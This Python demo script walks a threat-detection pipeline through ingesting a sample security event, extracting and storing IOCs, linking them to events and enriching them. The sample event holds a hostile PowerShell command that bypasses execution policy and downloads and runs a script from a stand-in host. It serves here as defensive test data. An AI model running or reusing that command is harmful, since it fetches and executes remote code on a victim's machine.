import json
from datetime import datetime, timezone
from app.core.database import SessionLocal, init_db
from app.modules.ingestion.service import LogIngestionService
from app.modules.extraction.service import EntityIOCExtractionService
from app.modules.enrichment.service import ThreatIntelEnrichmentService
from app.modules.enrichment.adapters.external import ExternalThreatIntelAdapter
from app.models.schemas import IOC


def run_phase4_demo():
    print("=" * 80)
    print("PHASE 4 — IOC EXTRACTION & THREAT INTEL ENRICHMENT DEMO")
    print("=" * 80)

    init_db()
    db = SessionLocal()
    try:
        ingest_svc = LogIngestionService()
        extraction_svc = EntityIOCExtractionService()
        enrichment_svc = ThreatIntelEnrichmentService()

        # Step 1: Ingest representative security event
        raw_event_payload = {
            "source": "network",
            "TimeCreated": "2026-09-12T01:30:00Z",
            "SourceIp": "10.0.4.15",
            "DestinationIp": "185.220.101.5",
            "DestinationPort": 4444,
            "Computer": "FINANCE-PC01.corp.internal",
            "TargetUserName": "admin_svc",
            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://exfil-node.xyz/payload.ps1')",
            "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "action": "ALLOW",
            "attack_id": "T1071.001",
        }

        stored_event = ingest_svc.ingest_event(db, raw_event_payload)

        print("\n1. REAL STORED SECURITY EVENT:")
        print(f"   Event ID:     {stored_event.event_id}")
        print(f"   Timestamp:    {stored_event.timestamp.isoformat()}")
        print(f"   Source:       {stored_event.source}")
        print(f"   Event Type:   {stored_event.event_type}")
        print(f"   Severity:     {stored_event.severity}")
        print(f"   Host:         {stored_event.host}")
        print(f"   User:         {stored_event.user}")
        print(f"   Raw Data:     {json.dumps(stored_event.raw_data, indent=6)}")

        # Step 2: Extract IOCs from the event
        extracted_iocs = extraction_svc.extract_iocs_from_event(stored_event)
        print(f"\n2. IOCs / ENTITIES EXTRACTED FROM EVENT ({len(extracted_iocs)} entities):")
        for ioc in extracted_iocs:
            print(f"   - [{ioc.type.upper()}] {ioc.value} (ID: {ioc.id})")

        # Step 3: Persist extracted IOCs to DB
        extraction_res = extraction_svc.extract_and_store_from_events(db, [stored_event.event_id])
        print(f"\n3. PERSISTED IOC DATABASE RECORDS ({extraction_res['unique_iocs_stored']} stored):")
        stored_iocs = extraction_svc.list_iocs(db)
        for ioc in stored_iocs[:6]:
            print(f"   - ID: {ioc.id} | Type: {ioc.type:10s} | Value: {ioc.value}")

        # Step 4: Event-to-IOC Relationship
        print("\n4. EVENT-TO-IOC RELATIONSHIP LINKING:")
        target_ioc = next((i for i in stored_iocs if i.type == "domain"), stored_iocs[0])
        ioc_with_events = extraction_svc.get_ioc_with_events(db, target_ioc.id)
        if ioc_with_events:
            print(f"   IOC: [{ioc_with_events['ioc'].type}] {ioc_with_events['ioc'].value} (ID: {ioc_with_events['ioc'].id})")
            print(f"   Linked Event IDs: {ioc_with_events['ioc'].metadata.get('related_event_ids')}")
            print(f"   Linked Security Events Count: {len(ioc_with_events['events'])}")
            for evt in ioc_with_events["events"]:
                print(f"     * [{evt.event_id}] {evt.source} | {evt.event_type} | Host: {evt.host}")

        # Step 5: Local & External Threat Intel Enrichment
        print("\n5. ENRICHMENT RESULT (Local Rules & Classification):")
        enriched_ioc = enrichment_svc.enrich_ioc(db, target_ioc.id)
        if enriched_ioc:
            print(f"   IOC ID:        {enriched_ioc.id}")
            print(f"   Value:         {enriched_ioc.value}")
            print(f"   Confidence:    {enriched_ioc.confidence_score}")
            print(f"   Tags:          {enriched_ioc.tags}")
            print(f"   Enrichment Metadata:")
            print(json.dumps(enriched_ioc.metadata.get("enrichment", {}), indent=6))

        # Step 6: Behavior when external threat intel API key is unconfigured
        print("\n6. BEHAVIOR WHEN EXTERNAL THREAT INTEL IS UNAVAILABLE:")
        unavail_adapter = ExternalThreatIntelAdapter(api_key=None)
        unavail_res = unavail_adapter.enrich(target_ioc)
        print(f"   External Adapter Configured: {unavail_adapter.is_available()}")
        print(f"   Returned Status:             {unavail_res['status']}")
        print(f"   Reputation Score:            {unavail_res['reputation']} (No fabricated malicious scores)")
        print(f"   Message:                     {unavail_res['details']['message']}")

        print("\n" + "=" * 80)
        print("DEMO COMPLETE — ALL REQUIREMENTS VERIFIED")
        print("=" * 80)

    finally:
        db.close()


if __name__ == "__main__":
    run_phase4_demo()
